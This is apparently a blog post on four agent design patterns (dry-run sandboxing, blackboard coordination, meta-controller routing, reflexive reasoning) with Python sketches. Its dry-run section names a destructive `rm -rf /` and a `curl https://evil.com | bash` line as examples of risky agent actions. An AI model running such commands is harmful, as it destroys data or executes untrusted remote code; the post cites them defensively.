# Four Emerging Agentic Patterns You Should Know: Dry-Run Harness, Blackboard, Meta-Controller, and Reflexive Agents

**March 21, 2026**

ReAct, Reflection, and Planning are table stakes now. If you're building production agentic systems in 2026, you've probably already implemented those patterns. But there's a second wave of patterns emerging from production systems that haven't made it into the canonical "8 patterns every agent builder should know" lists yet. They're quietly powering real systems, solving problems the established patterns can't handle alone, and they deserve your attention.

Let's talk about four production-tested patterns that are gaining adoption but not yet standardized: **Dry-Run Harness** (safe sandboxed simulation), **Blackboard Architecture** (shared workspace coordination), **Meta-Controller** (top-level task routing), and **Reflexive Agent** (adaptive reasoning strategy). These aren't academic curiosities—they're solving real production problems today.

## Why These Four?

The established patterns (ReAct, Reflection, Planning, Tool-Use, Multi-Agent, Tree-of-Thoughts, Semantic Memory, Self-Improvement) give you the building blocks. These four emerging patterns give you the **scaffolding** to make those blocks work at scale:

- **Dry-Run Harness:** Your ReAct agent wants to run `rm -rf /`. How do you stop it?
- **Blackboard:** Your multi-agent system needs coordination. Do you really want hard-wired message passing?
- **Meta-Controller:** You have 10 specialized agents. Who decides which one runs?
- **Reflexive Agent:** Your agent burns 5000 tokens on chain-of-thought for "What's 2+2?" Can it decide when reasoning is overkill?

Let's dig in.

---

## 1. Dry-Run Harness: Validate Before You Detonate

### The Problem

Your agent generates code. It looks plausible. Then it runs `curl https://evil.com | bash` or deletes your production database. ReAct gives you the loop. Dry-run gives you the **safety net**.

The dry-run harness pattern simulates agent actions in a sandboxed environment and validates expected outcomes **before** pushing anything to production. Think of it as a preview mode for agent actions, where you can inspect, test, and abort before the irreversible happens.

### When You Need It

- **High-stakes workflows:** Financial transactions, API write operations, infrastructure changes
- **Code generation:** Any agent that writes and executes code
- **External API calls:** Especially mutating operations (POST/PUT/DELETE)
- **Multi-step plans:** Where early failures cascade into expensive misfires

### When You Don't

- **Read-only operations:** Fetching data, running searches, generating text
- **Idempotent actions:** Operations you can safely retry without consequences
- **Low-cost failures:** When the blast radius is small and recovery is cheap

### Implementation Pattern

The basic structure:

```python
class DryRunHarness:
    def __init__(self, agent, sandbox_env):
        self.agent = agent
        self.sandbox = sandbox_env
        
    def execute(self, action, dry_run=True):
        if dry_run:
            # Run in sandbox, collect outcomes
            result = self.sandbox.simulate(action)
            
            # Validate expected outcomes
            if not self.validate_outcomes(result):
                return {"status": "rejected", "reason": result.error}
            
            # Optional: Human-in-the-loop approval
            if self.requires_approval(action):
                if not self.get_human_approval(action, result):
                    return {"status": "rejected", "reason": "human declined"}
            
            # Only now run for real
            return self.sandbox.execute_production(action)
        else:
            return self.agent.execute(action)
    
    def validate_outcomes(self, result):
        """Check exit codes, output patterns, state changes"""
        if result.exit_code != 0:
            return False
        if "error" in result.stdout.lower():
            return False
        # Domain-specific validation
        return True
```

### Sandbox Options

Your sandbox can range from lightweight to Fort Knox:

1. **Docker containers:** Fast startup, good isolation, ~100ms overhead
2. **gVisor:** Stronger kernel-level isolation, ~2x Docker overhead
3. **MicroVMs (Firecracker/Kata):** VM-level security, ~500ms-1s startup

For most agent workflows, Docker is sufficient. For untrusted code execution or multi-tenant systems, consider gVisor or microVMs.

### Production Gotchas

**State divergence:** Your sandbox might not perfectly mirror production (different env vars, missing credentials, stale data). Keep sandbox state fresh through periodic sync.

**False positives:** Overly strict validation rejects valid actions. Start permissive, tighten based on failure patterns.

**Performance tax:** Every dry-run doubles your execution time. For latency-sensitive agents, use dry-run selectively (high-risk actions only) or run in parallel with human approval gates.

### Real-World Example: OpenClaw's Execution Model

OpenClaw doesn't call this "dry-run" explicitly, but it implements the pattern through execution modes:

```python
# Safe by default: read-only tools
result = agent.read_file("config.yaml")  # No approval needed

# Risky operations require explicit confirmation
result = agent.exec(
    "rm -rf /tmp/cache",  
    approval_mode="ask"  # Human sees command before execution
)
```

The key insight: **default to safe, require explicit escalation for risk**. Your dry-run harness should make the safe path frictionless and the dangerous path deliberate.

### When to Graduate from Dry-Run

You don't need dry-run forever. Graduate to direct execution when:

- Your agent has a proven track record (>1000 safe actions)
- You have comprehensive observability (every action logged, traceable)
- Rollback is cheap (idempotent operations, version control, backups)
- Human monitoring is active (someone watching dashboard, alerts on anomalies)

But even then, keep the harness for **new action types** or **elevated privileges**. Trust is earned per capability, not globally.

---

## 2. Blackboard Architecture: The Shared Whiteboard for Multi-Agent Coordination

### The Problem

You have 5 agents working on a complex problem. Agent A does research, Agent B drafts a solution, Agent C critiques, Agent D refines, Agent E decides. How do they share context? Hard-coded message passing? JSON files? A database?

Blackboard architecture gives them a **shared workspace** where agents independently read, write, and refine a common problem state. Think of it like a literal whiteboard in a conference room—everyone can see the current state, add their contribution, and react to others' work.

### Historical Context

Blackboard architecture isn't new—it was invented in the 1970s for the HEARSAY-II speech recognition system at CMU. Speech recognition required coordination between phonetics, syntax, semantics, and pragmatics—each handled by a separate knowledge source. The blackboard was the coordination mechanism.

Fast forward to 2026: LLMs brought multi-agent systems back into fashion, and with them, the blackboard pattern is experiencing a major revival. Why? Because hard-wired message passing between agents doesn't scale. The blackboard decouples agents from each other.

### Core Components

Three pieces:

1. **Blackboard:** The shared workspace (public + optional private spaces)
2. **Agents (Knowledge Sources):** Independent modules with specific expertise
3. **Control Unit:** Decides which agents act next based on blackboard state

### Implementation Pattern

Here's a minimal blackboard system:

```python
from dataclasses import dataclass, field
from typing import List, Dict, Any

@dataclass
class BlackboardMessage:
    agent: str
    content: str
    timestamp: float
    space: str = "public"  # or "private"

class Blackboard:
    def __init__(self):
        self.public: List[BlackboardMessage] = []
        self.private: Dict[str, List[BlackboardMessage]] = {}
    
    def write(self, agent: str, content: str, space: str = "public"):
        msg = BlackboardMessage(agent, content, time.time(), space)
        if space == "public":
            self.public.append(msg)
        else:
            self.private.setdefault(space, []).append(msg)
    
    def read(self, agent: str, space: str = "public") -> List[BlackboardMessage]:
        """Agents read entire blackboard context"""
        if space == "public":
            return self.public
        return self.private.get(space, [])
    
    def get_context(self, spaces: List[str] = ["public"]) -> str:
        """Format blackboard for LLM prompt"""
        messages = []
        for space in spaces:
            msgs = self.public if space == "public" else self.private.get(space, [])
            messages.extend(msgs)
        
        return "\n\n".join([
            f"[{m.agent}]: {m.content}" 
            for m in sorted(messages, key=lambda x: x.timestamp)
        ])

class ControlUnit:
    def __init__(self, blackboard: Blackboard, agents: Dict[str, Agent]):
        self.blackboard = blackboard
        self.agents = agents
    
    def select_next_agents(self, query: str) -> List[str]:
        """LLM decides which agents should act based on blackboard state"""
        context = self.blackboard.get_context()
        
        prompt = f"""
Query: {query}

Current Blackboard State:
{context}

Available agents: {', '.join(self.agents.keys())}

Which agents should act next? Return JSON list.
"""
        
        response = llm_call(prompt)
        return json.loads(response)  # ["researcher", "critic"]
    
    def run_cycle(self, query: str, max_rounds: int = 10):
        """Main blackboard cycle"""
        for round in range(max_rounds):
            # Control unit selects agents
            selected = self.select_next_agents(query)
            
            # Selected agents act
            for agent_name in selected:
                agent = self.agents[agent_name]
                context = self.blackboard.get_context()
                response = agent.act(query, context)
                self.blackboard.write(agent_name, response)
            
            # Check stopping condition
            if self.should_stop(query):
                break
        
        return self.extract_solution()
```

### When Blackboard Wins

**Unstructured collaboration:** You don't know in advance which agents need to contribute or in what order. The blackboard lets agents self-organize based on the evolving problem state.

**Cross-functional problems:** Multiple domains (research, coding, legal review, security audit) need to collaborate, but pre-defining their interaction is brittle.

**Iterative refinement:** Agents build on each other's work through multiple rounds. The blackboard maintains the full history of reasoning.

**Decoupled agents:** Agents don't need to know about each other—they only need to understand the blackboard format. This makes adding new agents or removing broken ones trivial.

### When to Avoid Blackboard

**Simple pipelines:** If your workflow is linear (A → B → C), sequential orchestration is simpler. Don't pay the coordination overhead.

**Real-time systems:** The blackboard cycle (select → act → write → select) adds latency. For latency-sensitive workflows, use direct delegation.

**Small agent counts:** 2-3 agents? Message passing is fine. Blackboard shines at 4+ agents where pairwise communication explodes combinatorially.

### Blackboard vs Traditional Multi-Agent

| Approach | Coordination | Scalability | Overhead | Best For |
|----------|--------------|-------------|----------|----------|
| **Hard-wired messaging** | Explicit agent-to-agent calls | Poor (N² connections) | Low | Small, fixed teams (2-3 agents) |
| **Blackboard** | Shared workspace | Excellent (decoupled) | Medium | Dynamic teams (4+ agents), unclear workflows |
| **Meta-Controller** | Central orchestrator | Good | Low | Known task types, clear routing rules |

### Production Pattern: Hybrid Blackboard

Most production systems don't use pure blackboard—they combine it with other patterns:

```python
class HybridOrchestrator:
    def __init__(self):
        self.blackboard = Blackboard()
        self.meta_controller = MetaController()  # For initial routing
        self.control_unit = ControlUnit(self.blackboard)
    
    def solve(self, query: str):
        # Meta-controller does coarse routing
        specialist = self.meta_controller.route(query)
        
        # Specialist gets a private blackboard for collaboration
        private_space = f"task_{specialist}_blackboard"
        
        # Run blackboard cycle within specialist's domain
        self.control_unit.run_cycle(
            query, 
            space=private_space,
            agents=specialist.sub_agents
        )
        
        # Return aggregated result
        return self.blackboard.extract_solution(private_space)
```

This gives you the best of both worlds: coarse-grained routing (meta-controller) for task distribution, fine-grained collaboration (blackboard) within specialists.

---

## 3. Meta-Controller: The Orchestrator Who Routes Tasks to Specialists

### The Problem

You have 10 specialized agents: researcher, coder, writer, analyst, legal reviewer, security auditor, designer, QA tester, data scientist, project manager. A task comes in: "Build a customer dashboard."

Who decides which agents run? In what order? With what context? That's the meta-controller's job.

### What It Is

A **top-level orchestrator agent** that actively routes tasks to specialized sub-agents based on context, capability, and load. It's not a fixed pipeline—it's dynamic delegation.

Think of it as the manager who assigns work to team members based on their expertise and current workload. The meta-controller doesn't solve problems itself—it **coordinates** problem-solvers.

### Core Pattern

```python
class MetaController:
    def __init__(self, agents: Dict[str, Agent]):
        self.agents = agents
        self.task_history = []
    
    def route(self, task: str) -> List[str]:
        """Decide which agents to invoke for this task"""
        
        # Build context from agent capabilities
        capabilities = {
            name: agent.describe_capabilities() 
            for name, agent in self.agents.items()
        }
        
        prompt = f"""
Task: {task}

Available agents and capabilities:
{json.dumps(capabilities, indent=2)}

Recent task history:
{self.format_history(self.task_history[-5:])}

Which agents should handle this task? Consider:
1. Task requirements vs agent expertise
2. Dependencies (does agent B need agent A's output?)
3. Current agent load (avoid overloading busy agents)

Return JSON: {{"agents": ["name1", "name2"], "sequence": "parallel|sequential"}}
"""
        
        response = llm_call(prompt)
        routing = json.loads(response)
        return routing
    
    def execute(self, task: str):
        """Route and execute task"""
        routing = self.route(task)
        
        if routing["sequence"] == "parallel":
            results = self.execute_parallel(routing["agents"], task)
        else:
            results = self.execute_sequential(routing["agents"], task)
        
        # Log for future routing decisions
        self.task_history.append({
            "task": task,
            "agents": routing["agents"],
            "results": results
        })
        
        return self.aggregate_results(results)
```

### Routing Strategies

**Rule-based routing:** Fast, predictable, no LLM cost.

```python
def route_rule_based(self, task: str) -> List[str]:
    if "code" in task.lower():
        return ["researcher", "coder", "qa_tester"]
    elif "legal" in task.lower():
        return ["researcher", "legal_reviewer"]
    elif "data" in task.lower():
        return ["data_scientist", "analyst"]
    else:
        return ["researcher", "writer"]
```

**LLM-based routing:** Flexible, handles novel tasks, costs ~200-500 tokens per route.

```python
def route_llm_based(self, task: str) -> List[str]:
    # Use small, fast model for routing (GPT-4o-mini, etc.)
    return llm_route(task, self.agents)
```

**Hybrid routing:** Rule-based for common patterns, LLM for edge cases.

```python
def route_hybrid(self, task: str) -> List[str]:
    # Try rule-based first
    if agents := self.route_rule_based(task):
        return agents
    
    # Fall back to LLM for novel tasks
    return self.route_llm_based(task)
```

### When Meta-Controller Wins

**Large agent pools:** 5+ specialized agents where direct orchestration becomes unmaintainable.

**Dynamic workflows:** Task requirements vary widely, and you can't hardcode routing logic.

**Load balancing:** Some agents are overloaded, others idle. Meta-controller can distribute work intelligently.

**Hierarchical systems:** You have teams of agents (design team, engineering team, ops team), and the meta-controller routes to team leads.

### When to Avoid Meta-Controller

**Small agent counts:** 2-3 agents don't need orchestration—just call them directly.

**Fixed workflows:** If your workflow is always A → B → C, sequential orchestration is simpler.

**Latency-sensitive:** The routing decision adds an extra LLM call (~200-500ms). For real-time systems, pre-compute routing rules.

### Production Example: LangGraph

LangGraph (LangChain's orchestration framework) implements meta-controller through its state machine:

```python
from langgraph.graph import StateGraph

workflow = StateGraph(AgentState)

# Define agents as nodes
workflow.add_node("researcher", researcher_agent)
workflow.add_node("coder", coder_agent)
workflow.add_node("qa", qa_agent)

# Meta-controller decides edges dynamically
def should_code(state):
    return "needs_implementation" in state["task"]

def should_test(state):
    return "code_complete" in state["status"]

# Add conditional edges (meta-controller logic)
workflow.add_conditional_edges(
    "researcher",
    should_code,
    {True: "coder", False: "END"}
)

workflow.add_conditional_edges(
    "coder",
    should_test,
    {True: "qa", False: "END"}
)

workflow.set_entry_point("researcher")
app = workflow.compile()
```

The state graph **is** the meta-controller—it decides which agent runs next based on current state.

---

## 4. Reflexive Agent: Smart Enough to Know When Reasoning Is Overkill

### The Problem

Your ReAct agent gets a query: "What's 2 + 2?"

It does this:

```
Thought: I should carefully reason through this mathematical problem.
Thought: Let me break it down step-by-step.
Thought: 2 is an integer, and adding another 2...
Action: calculator(2 + 2)
Observation: 4
Thought: The result confirms my reasoning.
Answer: 4
```

That was 150 tokens to answer "4". Meanwhile, "Explain quantum entanglement" gets the same treatment—no chain-of-thought, just a rushed answer.

**Reflexive agents solve this:** they make real-time decisions about whether to reason internally (chain-of-thought) or reach for external tools, optimizing for speed, cost, and accuracy based on task complexity.

### The Pattern

```python
class ReflexiveAgent:
    def __init__(self, tools):
        self.tools = tools
    
    def act(self, query: str):
        # First: assess task complexity
        complexity = self.assess_complexity(query)
        
        if complexity == "trivial":
            # Direct answer, no reasoning, no tools
            return self.direct_answer(query)
        
        elif complexity == "simple":
            # Use tool, skip reasoning
            return self.tool_only(query)
        
        elif complexity == "moderate":
            # Chain-of-thought, then tool if needed
            reasoning = self.reason(query)
            if self.needs_tool(reasoning):
                return self.tool_call(reasoning)
            return reasoning
        
        else:  # complex
            # Full ReAct: iterative reasoning + tool use
            return self.react_loop(query)
    
    def assess_complexity(self, query: str) -> str:
        """Fast heuristic or small LLM call"""
        
        # Heuristic-based (cheap, fast)
        if len(query.split()) < 10 and any(op in query for op in ['+', '-', '*', '/']):
            return "trivial"
        
        if any(word in query.lower() for word in ["explain", "why", "how", "theory"]):
            return "complex"
        
        # LLM-based (flexible, ~100 tokens)
        prompt = f"Rate complexity (trivial/simple/moderate/complex): {query}"
        return llm_call(prompt, model="gpt-4o-mini", max_tokens=10)
    
    def direct_answer(self, query: str):
        """No reasoning, just answer"""
        return llm_call(query, max_tokens=50, temperature=0)
    
    def tool_only(self, query: str):
        """Extract intent, call tool, return result"""
        tool_name, args = self.extract_tool_call(query)
        return self.tools[tool_name](**args)
```

### Complexity Assessment Strategies

**Heuristic-based (fast, cheap, rigid):**

```python
def assess_complexity_heuristic(query: str) -> str:
    # Trivial: short queries with math operators
    if len(query.split()) < 10 and any(op in query for op in ['+', '-', '*', '/', '=']):
        return "trivial"
    
    # Simple: factual lookups
    if query.lower().startswith(("what is", "who is", "when did")):
        return "simple"
    
    # Complex: reasoning keywords
    if any(word in query.lower() for word in ["why", "how", "explain", "compare", "analyze"]):
        return "complex"
    
    return "moderate"
```

**LLM-based (flexible, adaptive, ~100-200 tokens):**

```python
def assess_complexity_llm(query: str) -> str:
    prompt = f"""
Rate task complexity:
- trivial: arithmetic, simple facts (no reasoning needed)
- simple: factual lookup (tool call sufficient)
- moderate: multi-step reasoning (chain-of-thought helpful)
- complex: ambiguous, creative, or multi-faceted (full ReAct needed)

Query: {query}
Complexity (one word):"""
    
    return llm_call(prompt, model="gpt-4o-mini", max_tokens=10).strip()
```

**Learned classifier (fastest, requires training):**

Train a small classifier (BERT, DistilBERT) on labeled examples of query complexity. Inference is <10ms, zero LLM cost.

### When Reflexive Wins

**Mixed workloads:** Some queries are trivial ("what's the capital of France?"), others are complex ("design a distributed system for..."). Reflexive agents adapt.

**Cost optimization:** Chain-of-thought adds 3-5x token overhead. Use it only when it actually helps.

**Latency sensitivity:** Direct answers are 10x faster than ReAct loops. For user-facing agents, responsiveness matters.

**Resource constraints:** Running on constrained compute (mobile, edge devices). Minimize unnecessary reasoning.

### When to Skip Reflexive

**Uniform complexity:** All your tasks are complex (research, creative writing, system design). No point in assessing—just default to full reasoning.

**Tiny cost:** If you're already running small models (<10B params), the reasoning overhead is negligible.

**Simple agents:** Your agent has 2 tools and handles one domain. The complexity assessment costs more than it saves.

### Production Pattern: Confidence-Based Reflexion

A refinement: use model confidence (logprobs) to decide reasoning depth.

```python
def act_confidence_based(self, query: str):
    # Get initial answer with logprobs
    response, confidence = llm_call_with_confidence(query)
    
    if confidence > 0.9:
        # High confidence → direct answer
        return response
    
    elif confidence > 0.7:
        # Medium confidence → verify with tool
        if tool_result := self.verify_with_tool(query, response):
            return tool_result
        return response
    
    else:
        # Low confidence → full reasoning
        return self.react_loop(query)
```

This is cleaner than explicit complexity assessment—let the model tell you when it's uncertain.

---

## Combining Patterns: Production Architecture

Real systems combine multiple patterns. Here's a realistic production stack:

```python
class ProductionAgentSystem:
    def __init__(self):
        # Meta-controller routes tasks to specialists
        self.meta_controller = MetaController()
        
        # Each specialist uses reflexive agents
        self.specialists = {
            "coder": ReflexiveAgent(tools=code_tools),
            "researcher": ReflexiveAgent(tools=search_tools),
            "analyst": ReflexiveAgent(tools=data_tools),
        }
        
        # High-risk specialists use dry-run harness
        self.coder_with_safety = DryRunHarness(
            agent=self.specialists["coder"],
            sandbox=DockerSandbox()
        )
        
        # Multi-agent tasks use blackboard
        self.blackboard = Blackboard()
    
    def solve(self, task: str):
        # 1. Meta-controller routes
        routing = self.meta_controller.route(task)
        
        # 2. Single specialist? Use reflexive agent directly
        if len(routing["agents"]) == 1:
            agent = self.specialists[routing["agents"][0]]
            
            # 3. Dry-run for risky actions
            if self.is_risky(task):
                return self.coder_with_safety.execute(task)
            
            return agent.act(task)
        
        # 4. Multiple specialists? Use blackboard coordination
        control_unit = ControlUnit(self.blackboard, self.specialists)
        return control_unit.run_cycle(task)
```

## Decision Matrix: Which Pattern When?

| Scenario | Use This | Why |
|----------|----------|-----|
| Agent generates code or makes API writes | **Dry-Run Harness** | Validate before detonation |
| 4+ agents with unclear coordination | **Blackboard** | Decoupled, self-organizing |
| Large agent pool (5+ specialists) | **Meta-Controller** | Dynamic routing beats hardcoded logic |
| Mixed simple/complex queries | **Reflexive Agent** | Optimize cost & latency per task |
| Fixed pipeline (A → B → C) | Sequential Orchestration | Don't over-engineer |
| 2-3 agents, clear workflow | Direct Calls | Keep it simple |

## Key Takeaways

1. **Dry-run is your safety net.** For high-stakes actions, simulate before executing. Graduate to direct execution only after proven reliability.

2. **Blackboard beats message passing at 4+ agents.** Decoupled coordination scales better than pairwise connections.

3. **Meta-controller is for routing, not solving.** It's the manager, not the worker. Use it when you have specialists and dynamic task types.

4. **Reflexive agents save 3-5x cost on mixed workloads.** Chain-of-thought is powerful but expensive—use it only when task complexity justifies it.

5. **Combine patterns in production.** Meta-controller for routing, reflexive agents for execution, dry-run for safety, blackboard for multi-agent coordination. They're complementary, not exclusive.

These patterns aren't just academic frameworks—they're battle-tested solutions to real production problems. The established patterns (ReAct, Reflection, Planning) give you agent **capabilities**. These four emerging patterns give you agent **architecture**.

Build capabilities first. Then add architecture when you hit their limits.

---

## Further Reading

- [Blackboard Architecture for LLM Multi-Agent Systems (arXiv, 2025)](https://arxiv.org/html/2507.01701v1)
- [AI Agent Orchestration Patterns (Microsoft Azure Architecture)](https://learn.microsoft.com/en-us/azure/architecture/ai-ml/guide/ai-agent-design-patterns)
- [15 Agentic AI Design Patterns (AI Tools Club)](https://aitoolsclub.com/15-agentic-ai-design-patterns-you-should-know-research-backed-and-emerging-frameworks-2026/)
- [Practical Security for Sandboxing Agentic Workflows (NVIDIA)](https://developer.nvidia.com/blog/practical-security-guidance-for-sandboxing-agentic-workflows-and-managing-execution-risk/)
